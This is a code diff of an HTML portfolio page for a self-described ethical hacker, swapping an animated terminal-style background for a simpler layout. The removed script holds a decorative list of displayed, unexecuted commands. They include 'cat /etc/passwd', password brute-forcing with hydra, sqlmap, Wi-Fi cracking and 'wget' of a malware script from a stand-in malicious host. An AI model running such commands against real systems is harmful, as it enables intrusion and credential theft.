@@ -2,273 +2,116 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Portofolio Ethical Hacker & Bug Bounty</title>
-  <link href="https://fonts.googleapis.com/css?family=Fira+Mono:400,700&display=swap" rel="stylesheet" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>PxZenon | Cybersecurity Portfolio</title>
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
   <style>
     body {
       margin: 0;
       padding: 0;
-      min-height: 100vh;
-      background-color: #181a20;
-      font-family: 'Fira Mono', monospace;
-      color: #e0e0e0;
-      overflow: hidden;
-      position: relative;
+      font-family: 'Share Tech Mono', monospace;
+      background-color: #0f1115;
+      color: #2dce89;
+      overflow-x: hidden;
     }
 
-    #terminal-bg {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: #181a20;
-      overflow: hidden;
-      z-index: 0;
-      font-size: 14px;
-      color: #2dce89aa;
-      user-select: none;
-      pointer-events: none;
-      white-space: nowrap;
-      line-height: 1.2;
-      font-weight: 600;
-    }
-
-    .terminal-line {
-      position: absolute;
-      white-space: nowrap;
-      animation-name: floatup;
-      animation-timing-function: linear;
-      animation-iteration-count: infinite;
-      color: #2dce89aa;
-      text-shadow: 0 0 3px #2dce89bb;
-    }
-
-    @keyframes floatup {
-      0% {
-        transform: translateY(100vh);
-        opacity: 0;
-      }
-      10% {
-        opacity: 1;
-      }
-      90% {
-        opacity: 1;
-      }
-      100% {
-        transform: translateY(-10vh);
-        opacity: 0;
-      }
-    }
-
-    .container {
-      position: relative;
-      z-index: 1;
-      width: 90%;
-      max-width: 420px;
-      margin: 10vh auto;
-      background: linear-gradient(135deg, #23262f, #1e2027);
-      border-radius: 16px;
-      box-shadow:
-        0 8px 32px rgba(45, 206, 137, 0.5),
-        inset 0 0 20px rgba(45, 206, 137, 0.3);
-      padding: 28px 20px;
+    .hero {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 80px 20px 40px;
       text-align: center;
-      backdrop-filter: blur(8px);
-      border: 1px solid #2dce89;
-      animation: subtle-glow 3s ease-in-out infinite alternate;
+      background: radial-gradient(circle at center, #121417 0%, #0f1115 100%);
     }
 
-    @keyframes subtle-glow {
-      0% {
-        box-shadow:
-          0 8px 24px rgba(45, 206, 137, 0.3),
-          inset 0 0 15px rgba(45, 206, 137, 0.2);
-      }
-      100% {
-        box-shadow:
-          0 8px 40px rgba(45, 206, 137, 0.7),
-          inset 0 0 30px rgba(45, 206, 137, 0.5);
-      }
-    }
-
-    .profile-img {
-      width: 120px;
-      height: 120px;
+    .hero img {
+      width: 140px;
+      height: 140px;
       object-fit: cover;
       border-radius: 50%;
       border: 3px solid #2dce89;
-      margin-bottom: 22px;
-      box-shadow: 0 0 12px #2dce89aa;
-      transition: transform 0.3s ease;
+      box-shadow: 0 0 20px #2dce89;
+      transition: transform 0.3s;
     }
 
-    .profile-img:hover {
-      transform: scale(1.1);
-      box-shadow: 0 0 20px #2dce89ff;
+    .hero img:hover {
+      transform: scale(1.08);
     }
 
-    .username {
-      font-size: 2.2rem;
-      font-weight: 700;
-      color: #2dce89;
-      margin-bottom: 12px;
-      text-shadow: 0 0 8px #2dce89cc;
+    .hero h1 {
+      margin: 20px 0 10px;
+      font-size: 2.4rem;
+      text-shadow: 0 0 8px #2dce89aa;
     }
 
-    .desc {
-      font-size: 1.2rem;
-      color: #a5d6a7;
-      margin-bottom: 28px;
-      line-height: 1.5;
-      text-shadow: 0 0 4px #2dce89bb;
+    .hero p {
+      font-size: 1.1rem;
+      color: #a7ffdd;
+      max-width: 480px;
+      line-height: 1.6;
+      text-shadow: 0 0 6px #2dce89aa;
     }
 
     .links {
+      margin-top: 30px;
       display: flex;
       flex-direction: column;
-      gap: 16px;
-      margin-top: 12px;
+      gap: 14px;
+      width: 100%;
+      max-width: 300px;
     }
 
     .links a {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 12px;
-      background: #181a20;
+      background: #111315;
       color: #2dce89;
-      text-decoration: none;
-      padding: 12px 0;
-      border-radius: 8px;
-      font-weight: 600;
-      transition: background 0.3s, color 0.3s;
       border: 1.5px solid #2dce89;
-      box-shadow: 0 0 8px #2dce8988;
-      font-size: 1rem;
+      text-decoration: none;
+      padding: 12px;
+      border-radius: 10px;
+      transition: all 0.3s ease;
+      text-align: center;
+      font-weight: bold;
+      box-shadow: 0 0 12px #2dce8970;
     }
 
     .links a:hover {
       background: #2dce89;
-      color: #181a20;
-      box-shadow: 0 0 20px #2dce89ff;
+      color: #0f1115;
+      box-shadow: 0 0 20px #2dce89cc;
     }
 
-    .links svg {
-      width: 22px;
-      height: 22px;
-      fill: currentColor;
-    }
-
-    @media (max-width: 480px) {
-      .username {
-        font-size: 1.6rem;
-      }
-
-      .desc {
-        font-size: 1rem;
-      }
-
-      .profile-img {
-        width: 90px;
-        height: 90px;
-      }
-
-      .links a {
-        font-size: 0.95rem;
-        padding: 10px 0;
-      }
-
-      .links svg {
-        width: 20px;
-        height: 20px;
-      }
+    .footer {
+      text-align: center;
+      padding: 20px;
+      font-size: 0.9rem;
+      color: #555;
+      background-color: #0a0c0f;
+      border-top: 1px solid #2dce8922;
     }
   </style>
 </head>
 <body>
-  <div id="terminal-bg"></div>
 
-  <div class="container">
-    <img src="etooo (1).jpg" alt="Foto Profil" class="profile-img" />
-    <div class="username">PxZenon</div>
-    <div class="desc">
-      Ethical Hacker & Bug Bounty Hunter.<br />
-      Passionate about cybersecurity, vulnerability research, and making the internet safer.
-    </div>
+  <section class="hero">
+    <img src="etooo (1).jpg" alt="Foto Profil">
+    <h1>PxZenon</h1>
+    <p>
+      Ethical Hacker & Bug Bounty Hunter. <br>
+      Berfokus pada keamanan aplikasi web, eksploitasi, dan membuat internet lebih aman.
+    </p>
+
     <div class="links">
-      <a href="https://hackerone.com/pxzenon" target="_blank" rel="noopener">
-        <svg viewBox="0 0 24 24"><path d="M2 21.5V2.5h4.5v7.5h10.5V2.5H21.5v19h-4.5v-7.5H6.5v7.5z"/></svg>
-        HackerOne
-      </a>
-      <a href="https://github.com/putra-bit" target="_blank" rel="noopener">
-        <svg viewBox="0 0 24 24"><path d="..."/></svg>
-        GitHub
-      </a>
-      <a href="https://x.com/pxzenon3" target="_blank" rel="noopener">
-        <svg viewBox="0 0 24 24"><path d="..."/></svg>
-        Twitter
-      </a>
-      <a href="https://www.linkedin.com/in/putra-abdul-azis-05716a320/" target="_blank" rel="noopener">
-        <svg viewBox="0 0 24 24"><path d="..."/></svg>
-        LinkedIn
-      </a>
+      <a href="https://hackerone.com/pxzenon" target="_blank">🔓 HackerOne</a>
+      <a href="https://app.hackthebox.com/profile/HTB_ID_KAMU" target="_blank">🧠 Hack The Box</a>
+      <a href="https://github.com/putra-bit" target="_blank">🐙 GitHub</a>
+      <a href="https://x.com/pxzenon3" target="_blank">🐦 Twitter</a>
+      <a href="https://www.linkedin.com/in/putra-abdul-azis-05716a320/" target="_blank">💼 LinkedIn</a>
     </div>
-  </div>
+  </section>
 
-  <script>
-    const terminalBg = document.getElementById('terminal-bg');
+  <footer class="footer">
+    &copy; 2025 PxZenon. Dibuat dengan semangat hacking hijau neon.
+  </footer>
 
-    const texts = [
-      "nmap -sV 192.168.1.1", "nuclei -t templates/ -u https://target.com",
-      "sqlmap -u 'http://target.com/vuln?id=1' --batch", "dirb http://target.com/",
-      "curl -I http://target.com", "ping -c 4 8.8.8.8", "whoami", "ls -la",
-      "cat /etc/passwd", "netstat -an", "chmod 755 script.sh",
-      "echo 'Hacking in progress...'", "sudo su -", "git clone https://github.com/...",
-      "rm -rf /tmp/*", "tcpdump -i eth0", "hydra -l admin -P passwords.txt ftp://192.168.1.1",
-      "ssh-keygen -t rsa", "msfconsole", "john --wordlist=password.lst hash.txt",
-      "airmon-ng start wlan0", "aircrack-ng capture.cap -w wordlist.txt",
-      "dig example.com ANY", "wget http://malicious.site/malware.sh",
-      "openssl s_client -connect target.com:443", "iptables -L -v", "tcpflow -r capture.pcap"
-    ];
-
-    function createTerminalLine() {
-      const line = document.createElement('div');
-      line.classList.add('terminal-line');
-
-      line.style.left = Math.random() * 100 + 'vw';
-      line.style.top = Math.random() * 100 + 'vh';
-      line.style.fontSize = (12 + Math.random() * 14) + 'px';
-
-      const alpha = 0.3 + Math.random() * 0.5;
-      line.style.color = `rgba(45, 206, 137, ${alpha})`;
-      line.style.textShadow = `0 0 6px rgba(45, 206, 137, ${alpha})`;
-
-      const duration = 7 + Math.random() * 8;
-      line.style.animationDuration = duration + 's';
-
-      terminalBg.appendChild(line);
-
-      let text = texts[Math.floor(Math.random() * texts.length)];
-      let idx = 0;
-
-      function type() {
-        if (idx < text.length) {
-          line.textContent += text.charAt(idx);
-          idx++;
-          setTimeout(type, 35);
-        }
-      }
-
-      type();
-
-      line.addEventListener('animationend', () => {
-        terminalBg.removeChild(line);
-      });
-    }
-
-    setInterval(createTerminalLine, 500); // bisa disesuaikan kalau mau lebih lambat
-  </script>
 </body>
 </html>
